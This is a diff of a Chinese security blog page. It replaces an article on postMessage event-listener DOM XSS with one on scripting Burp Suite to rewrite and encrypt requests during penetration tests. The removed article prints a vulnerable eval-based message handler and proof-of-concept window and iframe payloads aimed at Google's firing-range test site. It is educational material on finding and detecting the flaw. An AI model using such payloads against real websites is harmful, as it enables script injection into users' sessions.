@@ -5,12 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EventListener XSS - RainSec</title>
+    <title>灵活的修改Burp请求 - RainSec</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="RainSec,"> 
-    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,EventListener XSSXSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是DOM型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听postMessage所,"> 
+    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,灵活的修改Burp请求  在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密等一系列麻烦的事。更换请求头可以通过Burp的Match and Replace功能来实现，加解密也有一些插,"> 
     <meta name="author" content="RainSec"> 
     <link rel="alternative" href="atom.xml" title="RainSec" type="application/atom+xml"> 
     <link rel="icon" href="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg"> 
@@ -76,7 +76,7 @@
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg" alt="" data-url="https://rainsec.cn">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">EventListener XSS</h3>
+        <h3 class="subtitle">灵活的修改Burp请求</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -101,7 +101,7 @@
             animation-duration: 1.2s;
             background-image: 
                 radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/XSS_cover.jpg') ">
+                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/burp.png') ">
         </div>
         <div class="else">
             <p class="animated fadeInDown">
@@ -109,22 +109,22 @@
                 <a href="/categories/渗透测试"><b>「
                     </b>渗透测试<b> 」</b></a>
                 
-                March 25, 2022
+                March 05, 2022
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/post/EventListener%20XSS.html" title="EventListener XSS" class="">EventListener XSS</a>
+            <h3 class="post-title animated fadeInDown"><a href="/post/%E7%81%B5%E6%B4%BB%E7%9A%84%E4%BF%AE%E6%94%B9Burp%E8%AF%B7%E6%B1%82.html" title="灵活的修改Burp请求" class="">灵活的修改Burp请求</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    6k
+                    4.5k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    5 mins.
+                    4 mins.
                 </span>
                 
                 
@@ -137,7 +137,7 @@
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/XSS/" rel="tag">XSS</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/BurpSuite/" rel="tag">BurpSuite</a></li></ul>
             
         </div>
     </div>
@@ -158,119 +158,53 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <p><strong>EventListener XSS</strong><br>XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是<code>DOM</code>型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听<code>postMessage</code>所导致漏洞。首先从事件监听器开始说起</p>
-<h2 id="事件监听器"><a href="#事件监听器" class="headerlink" title="事件监听器"></a>事件监听器</h2><p>事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：</p>
-<pre><code class="HTML">&lt;table id="outside"&gt;
-    &lt;tr&gt;&lt;td id="t1"&gt;one&lt;/td&gt;&lt;/tr&gt;
-    &lt;tr&gt;&lt;td id="t2"&gt;two&lt;/td&gt;&lt;/tr&gt;
-&lt;/table&gt;
-&lt;script&gt;
-function modifyText() {
-  var t2 = document.getElementById("t2");
-  if (t2.firstChild.nodeValue == "three") {
-    t2.firstChild.nodeValue = "two";
-  } else {
-    t2.firstChild.nodeValue = "three";
-  }
-}
-
-// 为table添加事件监听器
-var el = document.getElementById("outside");
-el.addEventListener("click", modifyText, false);
-&lt;/script&gt;
-</code></pre>
-<p>以上代码监听了<code>table</code>的<code>click</code>事件，当点击<code>table</code>时会触发<code>modifyText</code>,下面链接列出了所有的事件:</p>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Events#event_index">https://developer.mozilla.org/en-US/docs/Web/Events#event_index</a></p>
-<p>这里要说的是<code>postMessage</code>与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下<code>postMessage</code>的介绍：</p>
-<p>&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <code>Document.domain</code>设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要<strong>正确的使用</strong>，这种方法就很安全。 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p>
-<p>它的用法也很简单：</p>
-<pre><code>windows.postMessage(message, targetOrigin, [transfer])
-</code></pre>
+            <h1 id="灵活的修改Burp请求"><a href="#灵活的修改Burp请求" class="headerlink" title="灵活的修改Burp请求"></a>灵活的修改Burp请求</h1><p>  在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密等一系列麻烦的事。更换请求头可以通过<code>Burp</code>的<code>Match and Replace</code>功能来实现，加解密也有一些插件可以实现，但是它们普遍存在着以下缺陷：</p>
 <ul>
-<li><p>windows是指一个窗口，可以是当前页面的<code>window</code>、<code>window.open</code>返回的窗口对象、<code>iframe</code>的<code>contentWindow</code>属性等</p>
+<li><p>自定义数据不能进行保存</p>
 </li>
-<li><p>message是要发送的消息，可以是字符串，也可以是<code>json</code>格式</p>
-</li>
-<li><p><code>targetOrigin</code>用来指定哪个窗口可以接收到消息，如果为<code>*</code>则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。</p>
+<li><p>加解密不能灵活的指定位置</p>
 </li>
 </ul>
-<p>发送消息事件可以通过如下方式添加监听事件：</p>
-<pre><code class="JavaScript">window.addEventListener("message", receiveMessage, false);
-function receiveMessage(event)
-{
-}
+<p>  带着这些需求，笔者在寻找工具时发现了一款有趣的插件<code>Python Scripter: https://github.com/PortSwigger/python-scripter</code> </p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>  与其说这是一个插件，不如说其更像是一个框架。简单地说，它的功能是将当前请求上下文作为全局变量传入用户自定义的代码中，也就是说用户可以随意的修改请求信息。它本身的代码也是很简单的</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image1.4mg8n7lywo40.png" alt="img"></p>
+<p>  首先是将请求信息传递给用户自定义脚本的集合中，然后每个脚本分别对请求信息进行处理</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image2.2hu9hc06lfi0.png" alt="img"></p>
+<p>  这里的处理其实就是用户编译代码通过后，把操作<code>Burp</code>的接口作为全局变量传递进去并执行</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image3.3fssj0kye600.png" alt="img"></p>
+<p>  这就实现了以插件“写”插件。</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image4.3vlf70bxkv80.png" alt="img"></p>
+<h2 id="完善"><a href="#完善" class="headerlink" title="完善"></a>完善</h2><p>  上文的框架让我们有了灵活操纵请求的希望，而<code>https://github.com/lanmaster53/pyscripter-er/blob/master/pyscripterer.py</code> 则成功的将其变为了现实。其定义了一个接受<code>messageInfo</code>等请求信息的<code>Class</code>，并且提供了许多写好的方法以便于更新请求信息，例如删除一个请求头，可以这么写：</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image5.2blkgsq9j98g.png" alt="img"></p>
+<p>  这样任何请求都将不存在<code>Sec-Ch-Ua-Mobile</code>这个字段，<code>remove_request_headers</code>就是<code>pyscripter-er</code>中定义好的一个方法，主要作用就是遍历移除指定<code>header_name</code>开头的<code>haeder</code>字段并重新构造请求包</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image6.2agpex1rcy3o.png" alt="img"></p>
+<p>  如果要增加新的通用函数只需要在<code>pyscripterer</code>中进行修改即可，比如增加一个添加请求头的方法</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image7.37vfz4dftim0.png" alt="img"></p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>  接下来用实战来检验下，在测试某个网站时碰到了如下加密请求</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image8.1y7vruzai6cg.png" alt="img"></p>
+<p>  通过分析<code>JS</code>发现其加密算法是<code>base64</code>加上一定的换位：</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image9.e84l9bc9ndc.png" alt="img"></p>
+<p>  那我们的思路就是每次请求时找到<code>jsonparams</code>这个参数，并对其进行加密，这样在发送请求时我们看到的参数就是未加密的了，方便我们在<code>repeater</code>进行测试。首先创建一个函数用于获取参数，根据参数名遍历即可</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image10.6sygad9jx6k0.png" alt="img"></p>
+<p>  删除找到的参数，之后重新创建一个新的参数，其值为加密后的值</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image11.76bg61giaqk0.png" alt="img"></p>
+<p>  加密函数</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image12.4rljs094wni0.png" alt="img"></p>
+<p>  结合起来调用</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image13.4yz7e159y7g0.png" alt="img"></p>
+<p>  当我们发送请求</p>
+<pre><code class="HTTP">jsonparams={"UserId":"1234"}
 </code></pre>
-<p>当发送信息时就会触发<code>receiveMessage</code>。其中<code>event</code>的属性比较重要的有：</p>
-<ul>
-<li><p>data 即<code>postMessage</code>发送的数据</p>
-</li>
-<li><p>origin 发送信息窗口的<code>origin</code></p>
-</li>
-</ul>
-<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码</p>
-<pre><code class="HTML">&lt;html&gt;
-  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;
-  &lt;body&gt;
-    &lt;script&gt;
-      var postMessageHandler = function(msg) {
-  var content = msg.data;
-  var msgObj = eval(content);
-
-  if (msgObj.isActive) {
-    document.write("PostMessage arrived!");
-  }
-}
-
-window.addEventListener('message', postMessageHandler, false);
-
-    &lt;/script&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
-&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;
-</code></pre>
-<p>很明显可以看出这个页面在监听到<code>postMessage</code>时会调用<code>eval</code>执行发送的信息，那我们就可以构造<code>payload</code>了</p>
-<pre><code class="HTML">&lt;script&gt;
-                    function pocLink() {
-                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');
-                        let msg = "alert(1);";
-
-                        setTimeout(function(){
-                            win.postMessage(msg, '*');
-                        }, 5000);
-                    }
-&lt;/script&gt;
- &lt;a href="#" onclick="pocLink();"&gt;PoC link&lt;/a&gt;         
-</code></pre>
-<p>或者是使用<code>iframe</code></p>
-<pre><code class="HTML">&lt;script&gt;
-
-  function pocFrame(win) {           
-    let msg = "alert(1);";
-
-    win.postMessage(msg, '*');          
-  }
-&lt;/script&gt;
- &lt;iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" onload="pocFrame(this.contentWindow)"&gt;&lt;/iframe&gt;    
-</code></pre>
-<p>也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个<code>iframe</code>并获取其句柄，用来传递信息。当打开的窗口中存在有<code>message</code>监听，且其触发代码有可利用点时就可以触发漏洞。</p>
-<h2 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h2><p>纯手工发现漏洞不可取，<code>Burp</code>的<code>DOM Invader</code>就可以帮助发现此类问题</p>
-<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image20.1l50zy96mokg.png" alt="img"></p>
-<p>对于<code>https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval</code> 它可以直接检测出漏洞存在并一键生成<code>POC</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image21.n4byv2n2acw.png" alt="img"></p>
-<p>为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替<a target="_blank" rel="noopener" href="https://github.com/fransr/postMessage-tracker">postMessage-tracker</a>入手进行分析。 其检测结果展示形式为</p>
-<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image22.6qq7cqyazzg0.png" alt="img"></p>
-<p>平平无奇的一个小框框，相较于<code>DOM Invader</code>的可利用性分析差了许多，不过仅仅了解下原理已然足够了。</p>
-<p>它的目录结构非常简单，首先看下<code>mainfest.json</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image23.1tng48w41gyo.png" alt="img"></p>
-<p><code>run_at</code>表明注入在<code>css</code>之后，<code>dom</code>构建之前。关键代码在<code>content_script.js</code>当中：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image24.6br43k6e3x00.png" alt="img"></p>
-<p>这一段的主要作用就是在添加监听器前判断其类型是否时<code>message</code>，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测<code>Burp</code>在此之上加入了危险函数判断的操作，后续有空的话就给<code>DOM Invader</code>加一个类似的功能练练手吧，日常使用当然还是<code>Burp</code>的香啊~</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/fransr/postMessage-tracker">https://github.com/fransr/postMessage-tracker</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">https://portswigger.net/burp/documentation/desktop/tools/dom-invader</a></p>
-</li>
-</ul>
+<p>  可以从<code>logger</code>中观测到其发生了变化，在<code>intruder</code>中的请求也会发生变化，再碰到需要爆破的场景时也是很实用的。</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image14.6jho2erfn2g0.png" alt="img"></p>
+<p>  除了对请求处理之外，我们也可以对响应做处理，而且操作结果会直接在当前页面里显现出来，不会像请求一样需要在日志里查看其修改结果，可以很好的解决响应内容加密的问题。还拿上面的请求为例，其响应内容是未加密的，这里给它做一次加密，简单的对相应内容做一次替换：</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image15.4rxk8cilfuw0.png" alt="img"></p>
+<p>  使用<code>base64</code>进行加密</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image16.3qx8u8ni4020.png" alt="img"></p>
+<p>  最终的结果如下</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image18.63sojynzc5s0.png" alt="img"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  使用<code>python-scripter</code>可以灵活的写出适用于不同场景下的插件，同时可以将其保存为模板，方便之后遇到相似情况下的使用。本次虽然遇到的加密算法比较简单，但是以<code>python</code>执行<code>jS</code>的便捷，相信再复杂些的算法也能很快的实现。</p>
+<p>  本文中修改过后的<code>pyscripterer</code>已上传至<code>github</code>: <a target="_blank" rel="noopener" href="https://github.com/No4l/python-scripter/blob/main/pyscripterer.py">https://github.com/No4l/python-scripter/blob/main/pyscripterer.py</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -337,7 +271,7 @@ window.addEventListener('message', postMessageHandler, false);
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">事件监听器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-number">2.</span> <span class="toc-text">漏洞触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">工具检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%81%B5%E6%B4%BB%E7%9A%84%E4%BF%AE%E6%94%B9Burp%E8%AF%B7%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">灵活的修改Burp请求</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E5%96%84"><span class="toc-number">1.2.</span> <span class="toc-text">完善</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">1.3.</span> <span class="toc-text">实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
                 </div>
             </div>
             
